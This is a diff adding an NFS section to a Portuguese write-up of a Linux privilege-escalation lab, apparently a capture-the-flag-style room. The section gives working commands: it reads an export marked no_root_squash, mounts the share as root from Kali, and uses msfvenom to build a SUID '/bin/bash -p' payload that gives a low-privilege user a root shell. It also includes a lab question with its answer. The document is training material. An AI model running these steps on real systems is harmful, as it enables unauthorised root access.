@@ -923,3 +923,61 @@ ssh -i root_key root@IP_HOST_ALVO
 ### Questões:
 
 - a. ***Read and follow along with the above.*** *Não há necessidade de resposta*
+
+## 19 - NFS
+
+Os arquivos criados via NFS herdam o ID do usuário remoto. Se o usuário for ***root*** e o ***root squashing*** estiver ativado, o ID será definido como o usuário "***nobody***".
+
+Verifique a configuração do compartilhamento NFS na VM Debian alvo:
+
+```shell
+user@debian:~$ cat /etc/exports 
+# /etc/exports: the access control list for filesystems which may be exported
+#               to NFS clients.  See exports(5).
+#
+# Example for NFSv2 and NFSv3:
+# /srv/homes       hostname1(rw,sync,no_subtree_check) hostname2(ro,sync,no_subtree_check)
+#
+# Example for NFSv4:
+# /srv/nfs4        gss/krb5i(rw,sync,fsid=0,crossmnt,no_subtree_check)
+# /srv/nfs4/homes  gss/krb5i(rw,sync,no_subtree_check)
+#
+
+/tmp *(rw,sync,insecure,no_root_squash,no_subtree_check)
+
+#/tmp *(rw,sync,insecure,no_subtree_check)
+```
+O compartilhamento ***/tmp*** tem root squashing desabilitada.
+
+Na máquina atacante (Kali Linux, por exemplo), mude para o usuário root se ainda não estiver executando como root.
+
+Usando o usuário root do Kali, crie um ponto de montagem  e monte-o em /tmp (atualize o IP de acordo):
+
+```shell
+┌──(root㉿kali)-[~]
+└─# mkdir /tmp/nfs
+┌──(root㉿kali)-[~]
+└─# mount -o rw,vers=2 10.10.133.218:/tmp /tmp/nfs
+```
+
+Ainda usando o usuário root do Kali, gere um payload usando ***msfvenom*** e salve-o no compartilhamento montado (este payload simplesmente chama ***/bin/bash***):
+
+```shell
+msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf
+```
+Ainda usando o usuário root do Kali, torne o arquivo executável e defina a permissão SUID:
+
+```shell
+chmod +xs /tmp/nfs/shell.elf
+```
+
+De volta à VM Debian alvo, como a conta de usuário com poucos privilégios, execute o arquivo para obter um shell de root:
+
+```shell
+/tmp/shell.elf
+```
+Um shell de usuário root será iniciado.
+
+### Questões:
+
+- a. ***What is the name of the option that disables root squashing?*** *no_root_squash*
